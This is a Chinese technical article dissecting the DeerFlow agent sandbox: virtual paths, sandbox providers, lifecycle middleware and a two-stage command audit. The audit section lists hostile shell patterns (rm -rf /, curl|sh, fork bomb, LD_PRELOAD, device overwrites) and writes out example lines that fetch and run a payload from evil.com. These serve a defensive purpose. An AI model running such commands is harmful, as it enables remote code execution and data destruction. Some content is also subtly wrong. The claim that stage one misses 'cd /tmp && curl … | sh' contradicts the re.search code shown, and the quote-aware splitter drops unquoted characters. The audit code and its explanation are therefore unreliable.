# 沙箱系统 — 安全隔离与虚拟文件系统

> DeerFlow Agent Harness 深度分析 · 第 5 篇

---

## 1. 概述与定位

### 在整体架构中的位置

沙箱系统是 Agent 与外部世界交互的安全边界——它定义了 Agent 可以执行什么命令、访问什么文件、在什么隔离级别下运行。没有沙箱，Agent 等于可以在宿主机上执行任意操作。

```
┌──────────────────────────────────────────────────────────────┐
│                      Agent 执行环境                            │
│                                                                │
│  ┌────────────────────────────────────────────────────────┐  │
│  │                  Sandbox (隔离边界)                     │  │
│  │                                                        │  │
│  │  /mnt/user-data/  →  用户数据（读写）                   │  │
│  │  /mnt/skills/     →  技能文件（只读）                   │  │
│  │                                                        │  │
│  │  bash → execute_command()  → 审计 → 执行              │  │
│  │  read_file → read_file()   → 路径验证 → 读取          │  │
│  │  write_file → write_file() → 路径验证 → 写入          │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                                │
│  SandboxMiddleware: 获取/释放沙箱                              │
│  SandboxAuditMiddleware: 命令安全审计                          │
└──────────────────────────────────────────────────────────────┘
```

### 解决的核心问题

1. **执行隔离**：Agent 的命令在受控环境中执行，不直接访问宿主机
2. **文件系统隔离**：Agent 只能访问虚拟路径下的文件
3. **命令安全**：危险命令被阻止，可疑命令被警告
4. **生命周期管理**：沙箱按需获取、自动释放
5. **实现可替换**：本地文件系统 vs Docker 容器，按配置切换

### 一句话设计哲学

**"沙箱是 Agent 的监狱——它定义了自由的范围，越界就是安全事件。"**

---

## 2. 架构总览

### 2.1 核心抽象

```
Sandbox (ABC)              SandboxProvider (ABC)
  │                              │
  ├── LocalSandbox               ├── LocalSandboxProvider
  │     (本地文件系统)            │     (per-thread 沙箱池)
  │                              │
  └── AioSandbox                 └── AioSandboxProvider
        (Docker 容器)                  (Docker 沙箱池)
```

### 2.2 虚拟路径映射

```
Agent 视角                    物理路径
/mnt/user-data/          → .deer-flow/users/{user_id}/threads/{thread_id}/
/mnt/user-data/workspace → .deer-flow/users/{user_id}/threads/{thread_id}/workspace/
/mnt/user-data/uploads   → .deer-flow/users/{user_id}/threads/{thread_id}/uploads/
/mnt/user-data/outputs   → .deer-flow/users/{user_id}/threads/{thread_id}/outputs/
/mnt/skills/             → skills/{public,custom}/
```

---

## 3. 源码走读

### 3.1 Sandbox ABC — 沙箱接口

```python
class Sandbox(ABC):
    _id: str

    def __init__(self, id: str):
        self._id = id

    @property
    def id(self) -> str:
        return self._id

    @abstractmethod
    def execute_command(self, command: str) -> str: ...

    @abstractmethod
    def read_file(self, path: str) -> str: ...

    @abstractmethod
    def list_dir(self, path: str, max_depth=2) -> list[str]: ...

    @abstractmethod
    def write_file(self, path: str, content: str, append: bool = False) -> None: ...

    @abstractmethod
    def glob(self, path: str, pattern: str, *, include_dirs: bool = False,
             max_results: int = 1000) -> tuple[list[str], bool]: ...

    @abstractmethod
    def grep(self, path: str, pattern: str, *, glob: str | None = None,
             literal: bool = False, case_sensitive: bool = True,
             max_results: int = 100) -> tuple[list[GrepMatch], bool]: ...

    @abstractmethod
    def update_file(self, path: str, content: bytes) -> None: ...
```

**7 个抽象方法**覆盖了 Agent 需要的所有文件系统操作：执行命令、读写文件、列出目录、模式匹配、内容搜索、文件更新。

### 3.2 SandboxProvider ABC — 沙箱工厂

```python
class SandboxProvider(ABC):
    @abstractmethod
    async def acquire(self, thread_id: str) -> str: ...

    @abstractmethod
    async def release(self, sandbox_id: str) -> None: ...

    @abstractmethod
    def get_sandbox(self, sandbox_id: str) -> Sandbox: ...

    @abstractmethod
    async def shutdown(self) -> None: ...
```

**生命周期**：`acquire` → `get_sandbox` → 使用 → `release` → `shutdown`

### 3.3 LocalSandbox — 本地文件系统实现

```python
class LocalSandbox(Sandbox):
    def __init__(self, id: str, path_mappings: dict[str, str]):
        super().__init__(id)
        self._path_mappings = path_mappings

    def execute_command(self, command: str) -> str:
        """通过 subprocess 执行命令。"""
        working_dir = self._path_mappings.get("workspace", "/")
        result = subprocess.run(
            command,
            shell=True,
            cwd=working_dir,
            capture_output=True,
            text=True,
            timeout=120,  # 2 分钟超时
        )
        if result.returncode != 0:
            return result.stderr or f"Command failed with exit code {result.returncode}"
        return result.stdout

    def read_file(self, path: str) -> str:
        """读取文件，支持虚拟路径解析。"""
        real_path = self._resolve_path(path)
        return Path(real_path).read_text(encoding="utf-8")

    def write_file(self, path: str, content: str, append: bool = False) -> None:
        """写入文件，支持虚拟路径解析。"""
        real_path = self._resolve_path(path)
        mode = "a" if append else "w"
        Path(real_path).parent.mkdir(parents=True, exist_ok=True)
        Path(real_path).write_text(content, encoding="utf-8") if not append \
            else Path(real_path).open(mode, encoding="utf-8").write(content)

    def _resolve_path(self, virtual_path: str) -> str:
        """将虚拟路径解析为物理路径。"""
        for virtual_prefix, real_prefix in self._path_mappings.items():
            if virtual_path.startswith(virtual_prefix):
                relative = virtual_path[len(virtual_prefix):].lstrip("/")
                return str(Path(real_prefix) / relative)
        return virtual_path  # 非虚拟路径，直接使用
```

**关键设计**：
- `path_mappings` 定义虚拟路径到物理路径的映射
- `execute_command` 使用 `subprocess.run` + `shell=True`，工作目录为 workspace
- 命令超时 120 秒，防止挂起

### 3.4 LocalSandboxProvider — 本地沙箱池

```python
class LocalSandboxProvider(SandboxProvider):
    def __init__(self):
        self._sandboxes: dict[str, LocalSandbox] = {}
        self._lock = threading.Lock()

    async def acquire(self, thread_id: str) -> str:
        with self._lock:
            if thread_id in self._sandboxes:
                return self._sandboxes[thread_id].id

            # 创建路径映射
            user_id = get_effective_user_id()
            thread_dir = get_thread_dir(user_id, thread_id)
            path_mappings = {
                "/mnt/user-data": str(thread_dir),
                "/mnt/user-data/workspace": str(thread_dir / "workspace"),
                "/mnt/user-data/uploads": str(thread_dir / "uploads"),
                "/mnt/user-data/outputs": str(thread_dir / "outputs"),
                "/mnt/skills": str(get_skills_dir()),
            }

            sandbox = LocalSandbox(
                id=f"local-{thread_id}",
                path_mappings=path_mappings,
            )
            self._sandboxes[thread_id] = sandbox
            return sandbox.id
```

**Per-thread 沙箱**：每个线程 ID 对应一个 LocalSandbox 实例，同一线程的多次请求复用同一沙箱。

### 3.5 沙箱工具：bash, ls, read_file, write_file, str_replace

```python
# bash 工具
@tool("bash", parse_docstring=True)
def bash_tool(command: str, runtime: ToolRuntime) -> str:
    """Execute a bash command in the sandbox."""
    sandbox = get_sandbox_from_runtime(runtime)
    return sandbox.execute_command(command)

# read_file 工具
@tool("read_file", parse_docstring=True)
def read_file_tool(path: str, runtime: ToolRuntime,
                   offset: int | None = None, limit: int | None = None) -> str:
    """Read a file from the sandbox."""
    sandbox = get_sandbox_from_runtime(runtime)
    content = sandbox.read_file(path)
    if offset is not None or limit is not None:
        lines = content.splitlines()
        start = (offset or 1) - 1
        end = start + (limit or len(lines))
        content = "\n".join(lines[start:end])
    return content

# str_replace 工具（精确编辑）
@tool("str_replace", parse_docstring=True)
def str_replace_tool(path: str, old_str: str, new_str: str,
                     runtime: ToolRuntime) -> str:
    """Replace exact string in a file."""
    sandbox = get_sandbox_from_runtime(runtime)
    content = sandbox.read_file(path)
    count = content.count(old_str)
    if count == 0:
        return f"Error: old_str not found in {path}"
    if count > 1:
        return f"Error: old_str appears {count} times in {path}, must be unique"
    new_content = content.replace(old_str, new_str)
    sandbox.write_file(path, new_content)
    return f"Successfully replaced 1 occurrence in {path}"
```

**str_replace 的设计**：要求 `old_str` 在文件中唯一出现，否则报错。这防止了意外替换多处相同文本。

### 3.6 SandboxMiddleware — 沙箱生命周期

```python
class SandboxMiddleware(AgentMiddleware[AgentState]):
    def __init__(self, provider: SandboxProvider, lazy_init: bool = True):
        self._provider = provider
        self._lazy_init = lazy_init

    def before_agent(self, state, runtime) -> dict | None:
        if not self._lazy_init:
            return self._acquire(state, runtime)
        return None

    def after_agent(self, state, runtime) -> dict | None:
        sandbox_state = state.get("sandbox")
        if sandbox_state and sandbox_state.get("sandbox_id"):
            self._provider.release(sandbox_state["sandbox_id"])
        return None

    def wrap_tool_call(self, request, handler):
        """懒初始化：首次工具调用时获取沙箱。"""
        if self._lazy_init and request.tool_call.get("name") in SANDBOX_TOOLS:
            # 检查沙箱是否已获取
            # 如果未获取，先获取再执行工具
            ...
        return handler(request)
```

**懒初始化流程**：

```
before_agent() → 跳过（lazy_init=True）
  │
  ├── [无工具调用的纯文本对话] → 沙箱从未获取 → 节省资源
  │
  └── [有工具调用]
        └── wrap_tool_call() → 首次调用时获取沙箱 → 执行工具
  │
after_agent() → 释放沙箱
```

### 3.7 SandboxAuditMiddleware — 命令安全审计

**两阶段分类算法**：

```python
class SandboxAuditMiddleware(AgentMiddleware[AgentState]):
    # 阶段 1：整命令扫描（捕获多语句攻击）
    HIGH_RISK_PATTERNS = [
        re.compile(r"rm\s+-rf\s+/(?!\w)"),           # rm -rf /
        re.compile(r"curl\b.*\|\s*(?:ba)?sh\b"),      # curl | sh
        re.compile(r"wget\b.*\|\s*(?:ba)?sh\b"),      # wget | sh
        re.compile(r":\(\)\{\s*:\|:&\s*\}"),           # fork bomb
        re.compile(r"LD_PRELOAD\s*="),                 # 动态链接注入
        re.compile(r"dd\s+if=.*of=/dev/"),             # 设备覆写
        re.compile(r"mkfs\b"),                         # 格式化
        re.compile(r":\s*>\s*/dev/sd"),                # 设备写入
    ]

    # 阶段 2：子命令分类
    MEDIUM_RISK_PATTERNS = [
        re.compile(r"(?:pip|pip3)\s+install"),         # 包安装
        re.compile(r"npm\s+install"),                   # 包安装
        re.compile(r"chmod\s+777"),                     # 危险权限
        re.compile(r"sudo\b"),                          # 提权
        re.compile(r"su\s+\w"),                         # 切换用户
        re.compile(r"apt(?:-get)?\s+install"),          # 系统包安装
    ]

    def wrap_tool_call(self, request, handler):
        if request.tool_call.get("name") != "bash":
            return handler(request)

        command = request.tool_call["args"].get("command", "")

        # 输入校验
        if not command.strip():
            return ToolMessage(content="Error: Empty command", ...)
        if len(command) > 10_000:
            return ToolMessage(content="Error: Command too long (>10000 chars)", ...)
        if "\0" in command:
            return ToolMessage(content="Error: Null byte in command", ...)

        # 阶段 1：整命令扫描
        for pattern in self.HIGH_RISK_PATTERNS:
            if pattern.search(command):
                return ToolMessage(
                    content=f"⛔ Command blocked: high-risk pattern detected. "
                            f"Command: {command[:200]}",
                    ...
                )

        # 阶段 2：子命令逐个分类
        sub_commands = self._split_compound(command)
        warnings = []
        for sub in sub_commands:
            risk = self._classify_risk(sub)
            if risk == "block":
                return ToolMessage(
                    content=f"⛔ Sub-command blocked: {sub}",
                    ...
                )
            if risk == "warn":
                warnings.append(sub)

        # 执行命令，追加警告
        result = handler(request)
        if warnings:
            warning_text = f"⚠️ Warning: risky sub-commands detected: {warnings}"
            return self._append_warning(result, warning_text)
        return result
```

**引用感知分割**：

```python
def _split_compound(self, command: str) -> list[str]:
    """按 &&, ||, ; 分割，但尊重引号内的分隔符。"""
    parts = []
    current = []
    in_single = False
    in_double = False
    i = 0

    while i < len(command):
        char = command[i]

        if char == '\\' and i + 1 < len(command):
            current.append(char)
            current.append(command[i + 1])
            i += 2
            continue

        if char == "'" and not in_double:
            in_single = not in_single
            current.append(char)
        elif char == '"' and not in_single:
            in_double = not in_double
            current.append(char)
        elif not in_single and not in_double:
            # 检查分隔符: &&, ||, ;
            if command[i:i+2] in ("&&", "||"):
                parts.append("".join(current).strip())
                current = []
                i += 2
                continue
            elif char == ";":
                parts.append("".join(current).strip())
                current = []
        else:
            current.append(char)
        i += 1

    if current:
        parts.append("".join(current).strip())

    # 未闭合引号 → 视为可疑整体
    if in_single or in_double:
        return [command]

    return [p for p in parts if p]
```

---

## 4. 核心机制详解

### 4.1 虚拟路径系统

Agent 看到的是虚拟路径（`/mnt/user-data/...`），实际访问的是物理路径。这提供了：
- **可移植性**：Agent 代码不依赖宿主机路径
- **隔离性**：不同用户的路径互不交叉
- **可测试性**：测试时可以映射到临时目录

```python
# 路径解析示例
virtual: /mnt/user-data/outputs/report.md
  → user_id: alice, thread_id: t123
  → physical: .deer-flow/users/alice/threads/t123/outputs/report.md
```

### 4.2 懒初始化 vs 急切初始化

| 模式 | 获取时机 | 释放时机 | 适用场景 |
|------|---------|---------|---------|
| 懒初始化 | 首次工具调用 | `after_agent` | 纯文本对话不需要沙箱 |
| 急切初始化 | `before_agent` | `after_agent` | 确保沙箱始终可用 |

DeerFlow 默认使用懒初始化，因为大多数对话是纯文本问答，不需要沙箱。

### 4.3 命令审计的两阶段必要性

**为什么需要两阶段？**

```
# 阶段 1 捕获的攻击（整命令级）
curl http://evil.com/payload.sh | sh    # ← 阶段 1 匹配 "curl.*|.*sh"

# 阶段 2 捕获的攻击（子命令级）
cd /tmp && curl http://evil.com/payload.sh | sh
# ↑ "cd /tmp" 安全，"curl ... | sh" 危险
# ← 阶段 1 不匹配（整命令不以 curl 开头）
# ← 阶段 2 分割后逐个检查，捕获 "curl ... | sh"
```

### 4.4 str_replace 的唯一性约束

```python
count = content.count(old_str)
if count == 0:
    return f"Error: old_str not found in {path}"
if count > 1:
    return f"Error: old_str appears {count} times in {path}, must be unique"
```

**设计动机**：如果 `old_str` 出现多次，替换行为不确定（替换第一个？全部？）。强制唯一性确保替换是确定性的。这与 Claude Code 的 `Edit` 工具设计一致。

---

## 5. 设计模式提取

### 5.1 抽象工厂模式（Abstract Factory）

`SandboxProvider` 是抽象工厂，`acquire()` 创建 `Sandbox` 实例。`LocalSandboxProvider` 创建 `LocalSandbox`，`AioSandboxProvider` 创建 `AioSandbox`。

### 5.2 策略模式（Strategy）

`Sandbox` 是策略接口，不同的实现提供不同的隔离级别。Agent 代码不关心底层是本地文件系统还是 Docker 容器。

### 5.3 代理模式（Proxy）

虚拟路径系统是代理模式——Agent 通过虚拟路径（代理）访问文件，底层解析为物理路径。

### 5.4 模板方法模式（Template Method）

`SandboxAuditMiddleware.wrap_tool_call()` 是模板方法：输入校验 → 阶段 1 扫描 → 阶段 2 分类 → 执行 → 追加警告。子类可以重写任何步骤。

---

## 6. 业界对比

| 特性 | DeerFlow | OpenAI Code Interpreter | E2B | Modal |
|------|---------|------------------------|-----|-------|
| **隔离级别** | 本地/容器可选 | gVisor 沙箱 | Firecracker VM | 容器 |
| **文件系统** | 虚拟路径映射 | /mnt/data | /home/user | /root |
| **命令审计** | 两阶段分类 | 无 | 无 | 无 |
| **懒初始化** | 支持 | N/A | N/A | N/A |
| **Per-user 隔离** | 文件路径隔离 | 单用户 | 单用户 | 单用户 |
| **工具集** | bash + 5 文件工具 | Python only | 完整 Linux | 完整 Linux |

**DeerFlow 的独特之处**：
1. **命令审计**：其他沙箱依赖隔离本身的安全性，DeerFlow 额外添加了应用层审计
2. **虚拟路径**：Agent 看到统一的 `/mnt/` 路径，不依赖宿主机结构
3. **懒初始化**：纯文本对话不分配沙箱资源

---

## 7. 面试关联

### Q1: Agent 沙箱的安全模型如何设计？

**标准回答**：

使用容器隔离、限制网络访问、限制文件系统访问。

**加分项**：

> "DeerFlow 的沙箱安全是**纵深防御**——三层保护：第一层是**隔离**（SandboxProvider 提供本地/容器两种隔离级别）；第二层是**虚拟路径**（Agent 只看到 /mnt/ 路径，物理路径由系统解析，防止路径遍历）；第三层是**命令审计**（SandboxAuditMiddleware 的两阶段分类：整命令扫描捕获多语句攻击如 `curl|sh`，子命令逐个分类捕获复合命令中的危险子命令）。关键细节是**引用感知分割**——按 &&/||/; 分割子命令但尊重引号内的分隔符，未闭合引号视为可疑整体。这种'隔离 + 审计'的双层模型比单纯依赖容器隔离更健壮，因为容器可能被配置错误或逃逸。"

### Q2: 如何防御命令注入？

**标准回答**：

输入验证、参数化执行、沙箱隔离。

**加分项**：

> "DeerFlow 的命令注入防御是**应用层审计 + 隔离层保护**。应用层：SandboxAuditMiddleware 在执行前检查命令——空命令、超长命令（>10000 字符）、null 字节直接拒绝；高风险模式（rm -rf /、curl|sh、fork bomb、LD_PRELOAD）阻止执行；中风险模式（pip install、chmod 777、sudo）警告但允许。隔离层：LocalSandboxProvider 在宿主机执行（低隔离），AioSandboxProvider 在 Docker 容器中执行（高隔离）。关键设计是 **host-bash 过滤**——LocalSandboxProvider 模式下自动从工具列表中移除 bash 工具，除非用户显式允许。这确保在低隔离环境下 Agent 无法执行任意命令。"

---

## 8. 扩展思考

### 8.1 局限与改进方向

| 局限 | 改进方向 |
|------|---------|
| LocalSandbox 无进程隔离 | 使用 nsjail/bubblewrap 提供轻量命名空间隔离 |
| 命令审计仅覆盖 bash | 扩展到 Python exec/eval 审计 |
| 无网络隔离 | 添加网络策略（允许/拒绝域名） |
| 无资源限制 | 添加 CPU/内存/磁盘配额 |
| str_replace 无原子性 | 使用文件锁或 write-to-temp + rename |
| 虚拟路径硬编码 | 支持自定义路径映射配置 |

### 8.2 如果重新设计

1. **微沙箱**：每个工具调用在独立微沙箱中执行，而非整个对话共享
2. **能力模型**：类似 Android 权限，每个工具声明需要的权限（FILE_READ, NETWORK, EXEC）
3. **审计日志**：所有沙箱操作写入不可变审计日志，支持事后分析
4. **自适应隔离**：根据命令风险自动选择隔离级别（低风险→本地，高风险→容器）

### 8.3 与前沿研究/产品的关联

- **E2B**：Firecracker 微 VM 隔离，DeerFlow 的 Docker 隔离更轻量但安全性更低
- **OpenAI Code Interpreter**：gVisor 沙箱，仅支持 Python，DeerFlow 支持任意命令
- **Claude Code**：本地执行 + 用户确认，DeerFlow 的审计模式更自动化
- **WebAssembly**：WASM 沙箱可能是未来的轻量隔离方案
